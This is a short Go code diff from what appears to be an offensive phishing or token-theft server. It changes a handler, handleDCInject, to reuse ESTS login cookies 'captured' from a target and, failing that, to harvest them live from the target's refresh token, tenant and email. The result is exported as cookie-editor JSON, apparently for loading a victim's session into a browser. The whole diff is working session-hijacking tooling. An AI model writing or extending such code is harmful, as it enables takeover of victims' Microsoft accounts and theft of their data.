@@ -1745,6 +1745,7 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	tenant := tgt.Tenant
 	email := tgt.Email
 	landingToken := tgt.LandingToken
+	cachedCookies := tgt.LoginCookies
 	tgt.mu.Unlock()
 
 	if rt == "" {
@@ -1755,7 +1756,23 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		tenant = "common"
 	}
 
-	entries := harvestESTSLoginCookies(rt, tenant, email)
+	// Prefer the cookies harvested at capture time (fresh, single round-trip).
+	// Fall back to a live harvest if the captured-at-capture run was empty or
+	// the field is missing on a target imported before this feature landed.
+	var entries []estsCookieEntry
+	if cachedCookies != "" {
+		_ = json.Unmarshal([]byte(cachedCookies), &entries)
+	}
+	if len(entries) == 0 {
+		entries = harvestESTSLoginCookies(rt, tenant, email)
+		if len(entries) > 0 {
+			if b, err := json.Marshal(entries); err == nil {
+				tgt.mu.Lock()
+				tgt.LoginCookies = string(b)
+				tgt.mu.Unlock()
+			}
+		}
+	}
 	cookieJSON, _ := json.Marshal(entries)
 	cookieEditorJSON, _ := json.MarshalIndent(entries, "", "  ")
 
